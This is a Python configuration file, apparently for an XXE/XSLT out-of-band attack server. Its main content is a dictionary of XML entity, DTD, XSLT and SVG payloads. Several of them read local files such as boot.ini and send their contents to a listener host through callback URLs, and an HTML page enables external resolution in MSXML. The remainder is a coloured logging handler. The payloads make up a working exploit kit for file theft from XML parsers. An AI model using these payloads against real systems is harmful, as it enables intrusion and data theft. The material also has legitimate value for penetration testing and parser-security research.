
#coding: utf8
import cgi

import ctypes
import logging
import os
import sys

import packets

__author__ = 'Gifts'

HOST = 'localhost'
dns_enabled = True
daemonize = 0

## ===============================================================

LOGGING_FORMAT = "%(asctime)s:%(levelname)s:%(message)s"

INT_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1234
LISTEN_PORT = ''
if INT_PORT:
    LISTEN_PORT = ":{0}".format(INT_PORT)

FILE_LIST = [
    r'c:\boot.ini',
    r'd:\boot.ini',
]

PAYLOADS = {
    'xml_test': packets.Packet('''<?xml version="1.0" encoding="UTF-8" standalone="no"?>
    <!DOCTYPE html [
        <!ENTITY % external SYSTEM "http://{host}{port}/{filename}">
        %external;
        ]>
    <html>
        <element attrib=""></element>
    </html>'''),

    'xml': packets.Packet('''<?xml version="1.0" encoding="UTF-8" standalone="no"?>
    <!DOCTYPE html [
        <!ENTITY % external SYSTEM "http://{host}{port}/{filename}">
        %external;
        %intern;
        %trick;
        ]>
    <html>
        <element attrib="">&test;</element>
    </html>'''),

    # ----------------------------------------------------------------------------------------------

    'xml_internal': packets.Packet('''<!ENTITY % external SYSTEM "http://{host}{port}/{filename}">
        %external;
        %intern;
        %trick;
    '''),

    # ----------------------------------------------------------------------------------------------

    'doctype_test': packets.Packet('''<?xml version="1.0" encoding="UTF-8" standalone="no"?>
    <!DOCTYPE roo SYSTEM "http://{host}{port}/{filename}">
    <html></html>'''),

    'xsd_test_1': packets.Packet('''<?xml version="1.0" encoding="UTF-8" standalone="no"?>
    <html
          xmlns="http://schemas.microsoft.com/unregistered-namespace"
          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
          xsi:schemaLocation="http://schemas.microsoft.com/unregistered-namespace
          http://{host}{port}/xsd_result">
    </html>
    '''),

    'xsd_test_2': packets.Packet('''<?xml version="1.0" encoding="UTF-8" standalone="no"?>
    <html
          xmlns="http://schemas.microsoft.com/unregistered-namespace"
          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
          xsi:noNamespaceSchemaLocation="http://{host}{port}/xsd_result">
    </html>
    '''),

    # ----------------------------------------------------------------------------------------------

    'oob_general_1': packets.Packet('''
    <!ENTITY % payload "{filename}">
    <!ENTITY % intern "<!ENTITY trick SYSTEM 'http://{host}{port}/result?%payload;'>">
    '''),

    'oob_general_2': packets.Packet('''
    <!ENTITY % payload SYSTEM "{filename}">
    <!ENTITY % intern "<!ENTITY trick SYSTEM 'http://{host}{port}/result?%payload;'>">
    '''),

    # ----------------------------------------------------------------------------------------------

    'oob_parameter_1': packets.Packet('''
    <!ENTITY % payload "{filename}">
    <!ENTITY % intern "<!ENTITY &#37; trick SYSTEM 'http://{host}{port}/result?%payload;'>">
    '''),
    'oob_parameter_2': packets.Packet('''
    <!ENTITY % payload SYSTEM "{filename}">
    <!ENTITY % intern "<!ENTITY &#37; trick SYSTEM 'http://{host}{port}/result?%payload;'>">
    '''),
    'oob_parameter_3': packets.Packet('''
    <!ENTITY % payload SYSTEM "{filename}">
    <!ENTITY % intern "<!ENTITY &#37; trick SYSTEM 'http://{host}{port}/result?%payload;'>">
    %intern;
    %trick;
    '''),
    # ----------------------------------------------------------------------------------------------

    '3_deep': packets.Packet('''
    <!ENTITY % deeper SYSTEM "http://{host}{port}/3_deep_2?{filename}">
    %deeper;

    <!ENTITY % intern "<!ENTITY &#37; trick SYSTEM 'http://{host}{port}/result?%payload3;'>">
    '''),

    '3_deep_2': packets.Packet(r'''
    <!ENTITY % payload SYSTEM "{filename}">
    <!ENTITY % payload2 "<!ENTITY &#37; payload3 '%payload;'>">
    %payload2;'''),

    # ----------------------------------------------------------------------------------------------

    'data_1': packets.Packet('''<iframe src="data:application/xml;base64,{0}">'''.format(
        '''<?xml version="1.0" encoding="UTF-8" standalone="no"?>
    <!DOCTYPE svg[
        <!ENTITY % blah1 SYSTEM "http://{host}{port}/xml_1?2_3?http://{host}{port}/text">
        %blah1;
    ]>
    <svg></svg>'''
        .format(
            **{'host': HOST, 'port': LISTEN_PORT}
        ).replace('\n', '')#  ).encode('base64').replace('\n', '')
    )),

    # ----------------------------------------------------------------------------------------------

    'favicon.ico': packets.Packet('''<?xml version="1.0" encoding="UTF-8" standalone="no"?>
    <!DOCTYPE svg [
        <!ENTITY % external SYSTEM "http://{host}{port}/favicon_result">
        %external;
        %intern;
    ]>
    <svg version="1.1"
    baseProfile="full"
    xmlns="http://www.w3.org/2000/svg"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:xlink="http://www.w3.org/1999/xlink"
    xmlns:ev="http://www.w3.org/2001/xml-events"
    width="100%"
    height="100%">
    <rect fill="white" x="0" y="0" width="100%" height="100%" />
    <rect fill="silver" x="0" y="0" width="100%" height="100%" rx="1em" />
    &trick;
    </svg>
    ''', mimetype='image/svg'),

    # ----------------------------------------------------------------------------------------------

    'xslt_test': packets.Packet('''<?xml version="1.0" encoding="UTF-8" standalone="no"?>
    <?xml-stylesheet href="http://{host}{port}/{filename}" type="application/xml"?>
    <html></html>'''),

    'xslt_main.xml': packets.Packet('''<?xml version="1.0" encoding="UTF-8" standalone="no"?>
    <?xml-stylesheet type="application/xml" href="xslt_main_sheet?{filename}"?>
    <text></text>'''),

    'xslt_main_sheet': packets.Packet('''<?xml version="1.0"?>
    <xsl:stylesheet version="1.1" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <xsl:variable name="payload" select="document('{filename}',/)"/>
        <xsl:variable name="combine" select="concat('http://{host}{port}/result', $payload)"/>
        <xsl:variable name="result" select="document($combine)" />
    </xsl:template>
    </xsl:stylesheet>'''),

    'xslt_2': packets.Packet('''<?xml version="1.0" encoding="UTF-8" standalone="no"?>
    <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
        <xsl:output method="xml" indent="yes"/>
        <xsl:template match="/persons">
            <root>
                <xsl:apply-templates select="person"/>
            </root>
        </xsl:template>
        <xsl:template match="person">
            <name username="{{@username}}">
                <xsl:value-of select="name" />
            </name>
        </xsl:template>
    </xsl:stylesheet>'''),

    # ----------------------------------------------------------------------------------------------

    'msxml': packets.Packet(r'''<HTML>
    <HEAD>
      <TITLE>sample</TITLE>
      <SCRIPT language = "javascript">
         function init()
         {{
            var srcTree = new ActiveXObject("Msxml2.DOMDocument.6.0");
            //srcTree.();
            srcTree.validateOnParse = true;
            srcTree.ResolveExternals = true;
            srcTree.async=false;
            // You can substitute other XML file names here.
            srcTree.load("xml");

            var xsltTree= new ActiveXObject("Msxml2.DOMDocument.6.0");
            xsltTree.async = false;
            // You can substitute other XSLT file names here.
            xsltTree.load("hello.xsl");

            resTree.innerHTML = srcTree.transformNode(xsltTree);
         }}
      </SCRIPT>
    </HEAD>

    <BODY onload = "init()" >
       <div id="resTree"></div>
    </BODY>
    </HTML>''',mimetype='text/html'),

    'html_xslt.xml': packets.Packet('''<html>
    <head>
    <script>
    function loadXMLDoc(dname)
    {{
    if (window.XMLHttpRequest)
      {{
      xhttp=new XMLHttpRequest();
      }}
    else
      {{
      xhttp=new ActiveXObject("Microsoft.XMLHTTP");
      }}
    xhttp.open("GET",dname,false);
    xhttp.send("");
    return xhttp.responseXML;
    }}

    function displayResult()
    {{
    xml=loadXMLDoc("tag");
    xsl=loadXMLDoc("xslt_main_sheet?http://ya.ru");
    // code for IE
    if (window.ActiveXObject)
      {{
      ex=xml.transformNode(xsl);
      document.getElementById("example").innerHTML=ex;
      }}
    // code for Mozilla, Firefox, Opera, etc.
    else if (document.implementation && document.implementation.createDocument)
      {{
      xsltProcessor=new XSLTProcessor();
      xsltProcessor.importStylesheet(xsl);
      resultDocument = xsltProcessor.transformToFragment(xml,document);
      document.getElementById("example").appendChild(resultDocument);
      }}
    }}
    </script>
    </head>
    <body onload="displayResult()">
    <div id="example" />
    </body>
    </html>''', mimetype='text/html'),



    # ----------------------------------------------------------------------------------------------

    'text': packets.Packet('HEKKED123456', mimetype='text/plain'),
    'test': packets.Packet('HEKKED123456', mimetype='text/plain'),
    #'bad': '\x00\x01\x02',
    'multiline': packets.Packet('''blah\nblah\nblah\n123''', mimetype='text/plain'),
    'tag': packets.Packet('<a>qwertyuiopasdfghjklzxcvbnm</a>', mimetype='text/plain'),

    # ----------------------------------------------------------------------------------------------

    'xslt_undone': packets.Packet('''<?xml version="1.0" encoding="UTF-8" standalone="no"?>

<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:xs="http://www.w3.org/2001/XMLSchema"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
>

<xsl:template match="/">

  <html>
  <body>
      <xsl:copy-of select="document('xslt')">
        <xsl:fallback>
            <xsl:copy-of select="document('ErRoR2')"/>
        </xsl:fallback>
    </xsl:copy-of>
    <h2>My CD Collection</h2>
    <table border="1">
      <tr bgcolor="#9acd32">
        <th>Title</th>
        <th>Artist</th>
      </tr>
      <xsl:for-each select="catalog/cd">
        <tr>
          <td><xsl:value-of select="title"/></td>
          <td><xsl:value-of select="artist"/></td>
        </tr>
      </xsl:for-each>
    </table>
  </body>
  </html>
</xsl:template>

</xsl:stylesheet> '''),
    'redirect1': packets.Packet('', headers={'Location': 'http://{host}{port}/text', 'Content-length': 0}, status=301),
    'ErRoR': packets.Packet('', status=404),
    'rss': packets.Packet('''<?xml version="1.0" encoding="UTF-8" standalone="no"?><!DOCTYPE rss SYSTEM "http://{host}{port}/xml_internal?{filename}"><rss/>''', mimetype='application/rss+xml; charset=utf-8'),
    'interactive': packets.Packet('''<!ENTITY % payload SYSTEM "{filename}">
                    <!ENTITY % intern "<!ENTITY trick SYSTEM 'http://{host}{port}/result?%payload;'>">''')
}

PAYLOADS['list'] = packets.Packet('<list><name>{0}</name></list>'.format(
    "</name><name>".join(
        map(
            lambda x: cgi.escape(x),
            sorted(PAYLOADS)
        )
    )
))

PAYLOADS['list_full'] = packets.Packet('<list><entry>{0}</entry></list>'.format(
    "</entry><entry>".join(
        [
            '<name>{0}</name><payload>{1}</payload>'.format(
                key,
                "".join(map(
                    lambda x: '&#{0:02d};'.format(ord(x)),
                    PAYLOADS[key].content
                ))
            )
            for key in PAYLOADS
        ]
    )
))

class ColorizingStreamHandler(logging.StreamHandler):
    # color names to indices
    color_map = {
        'black': 0,
        'red': 1,
        'green': 2,
        'yellow': 3,
        'blue': 4,
        'magenta': 5,
        'cyan': 6,
        'white': 7,
    }

    #levels to (background, foreground, bold/intense)
    if os.name == 'nt':
        level_map = {
            logging.DEBUG: (None, 'blue', True),
            logging.INFO: (None, 'green', False),
            logging.WARNING: (None, 'yellow', True),
            logging.ERROR: (None, 'red', True),
            logging.CRITICAL: ('red', 'white', True),
        }
    else:
        level_map = {
            logging.DEBUG: (None, 'blue', False),
            logging.INFO: (None, 'green', False),
            logging.WARNING: (None, 'yellow', False),
            logging.ERROR: (None, 'red', False),
            logging.CRITICAL: ('red', 'white', True),
        }
    csi = '\x1b['
    reset = '\x1b[0m'

    @property
    def is_tty(self):
        isatty = getattr(self.stream, 'isatty', None)
        return isatty and isatty()

    def emit(self, record):
        try:
            message = self.format(record)
            stream = self.stream
            if not self.is_tty:
                stream.write(bytes(message))
            else:
                self.output_colorized(message)
            stream.write(bytes(getattr(self, 'terminator', '\n')))
            self.flush()
        except (KeyboardInterrupt, SystemExit):
            raise
        except:
            self.handleError(record)

    if os.name != 'nt':
        def output_colorized(self, message):
            self.stream.write(message)
    else:
        import re

        ansi_esc = re.compile(r'\x1b\[((?:\d+)(?:;(?:\d+))*)m')

        nt_color_map = {
            0: 0x00, # black
            1: 0x04, # red
            2: 0x02, # green
            3: 0x06, # yellow
            4: 0x01, # blue
            5: 0x05, # magenta
            6: 0x03, # cyan
            7: 0x07, # white
        }

        def output_colorized(self, message):
            parts = self.ansi_esc.split(message)
            write = self.stream.write
            h = None
            fd = getattr(self.stream, 'fileno', None)
            if fd is not None:
                fd = fd()
                if fd in (1, 2):  # stdout or stderr
                    h = ctypes.windll.kernel32.GetStdHandle(-10 - fd)
            while parts:
                text = parts.pop(0)
                if text:
                    write(text)
                if parts:
                    params = parts.pop(0)
                    if h is not None:
                        params = [int(p) for p in params.split(';')]
                        color = 0
                        for p in params:
                            if 40 <= p <= 47:
                                color |= self.nt_color_map[p - 40] << 4
                            elif 30 <= p <= 37:
                                color |= self.nt_color_map[p - 30]
                            elif p == 1:
                                color |= 0x08  # foreground intensity on
                            elif p == 0:  # reset to default color
                                color = 0x07
                            else:
                                pass  # error condition ignored
                        ctypes.windll.kernel32.SetConsoleTextAttribute(h, color)

    def colorize(self, message, record):
        if record.levelno in self.level_map:
            bg, fg, bold = self.level_map[record.levelno]
            params = []
            if bg in self.color_map:
                params.append(str(self.color_map[bg] + 40))
            if fg in self.color_map:
                params.append(str(self.color_map[fg] + 30))
            if bold:
                params.append('1')
            if params:
                if '\n' in message:
                    message = "\n".join(
                        map(
                            lambda val: ''.join((self.csi, ';'.join(params), 'm', val, self.reset)),
                            message.split('\r\n')
                        )
                    )
                else:
                    message = ''.join((self.csi, ';'.join(params), 'm', message, self.reset))
        return message

    def format(self, record):
        message = logging.StreamHandler.format(self, record)
        if self.is_tty:
            # Don't colorize any traceback
            if 'Traceback' in message:
                parts = message.split('\n', 1)
                parts[0] = self.colorize(parts[0], record)
                message = '\n'.join(parts)
            else:
                message = self.colorize(message, record)
        return message
    formatter = logging.Formatter(LOGGING_FORMAT)

## Loading local config outside of git
try:
    from local_config import *
except ImportError:
    pass

